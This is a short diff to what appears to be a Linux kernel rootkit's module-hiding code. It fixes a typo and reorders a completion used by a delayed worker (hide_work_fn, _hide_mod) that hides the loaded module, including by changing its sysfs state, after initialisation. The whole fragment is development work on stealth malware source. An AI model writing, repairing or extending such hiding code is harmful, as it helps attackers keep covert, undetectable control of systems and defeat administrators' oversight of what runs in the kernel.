@@ -184,8 +184,10 @@ static inline void kv_list_del(struct list_head *prev, struct list_head *next)
 	prev->next = next;
 }
 
+static DECLARE_COMPLETION(hide_work_done);
 static void hide_work_fn(struct work_struct *work)
 {
+	reinit_completion(&hide_work_done);
 	// Set here because it is set to
 	// MODULE_STATE_LIVE in do_init_module.
 	// __module_address will return NULL for us
@@ -205,7 +207,6 @@ static void hide_work_fn(struct work_struct *work)
 }
 
 static DECLARE_DELAYED_WORK(hide_work, hide_work_fn);
-statuc DECLARE_COMPLETION(hide_work_done);
 
 static int _hide_mod(void)
 {
@@ -258,7 +259,6 @@ static int _hide_mod(void)
 	lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
 
 	// Some hiding steps need to be done after do_init_module
-	reinit_completion(&hide_work_done);
 	schedule_delayed_work(&hide_work, msecs_to_jiffies(2000));
 
 	return 0;
